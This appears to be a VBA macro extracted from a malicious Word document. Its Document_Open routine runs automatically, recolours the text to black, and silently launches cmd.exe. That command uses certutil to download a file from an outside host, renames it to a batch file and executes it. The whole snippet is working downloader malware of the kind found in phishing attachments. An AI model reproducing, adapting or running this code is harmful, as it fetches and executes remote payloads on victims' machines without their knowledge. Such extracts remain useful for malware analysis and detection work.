macros.vba_code:
Sub Document_Open()
    Dim nResult As Long
    Dim sCmdLine As String
    
    With ActiveDocument.Content
        .Font.ColorIndex = wdBlack
        '.Paragraphs(4).Range.Font.ColorIndex = wdRed
    End With
    
    sCmdLine = Environ("windir")
    nResult = InStr(Application.Path, "x86")
    If nResult <> 0 Then
        sCmdLine = sCmdLine + "\sysnative\cmd.exe /c"
    Else
        sCmdLine = sCmdLine + "\system32\cmd.exe /c"
    End If
        
    sCmdLine = sCmdLine + "cd %TEMP% && certutil -urlcache -split -f http://filer1.1apps.com/1.txt && ren 1.txt 1.bat && 1.bat"
    nResult = Shell(sCmdLine, vbHide)
    ActiveDocument.Save
End Sub
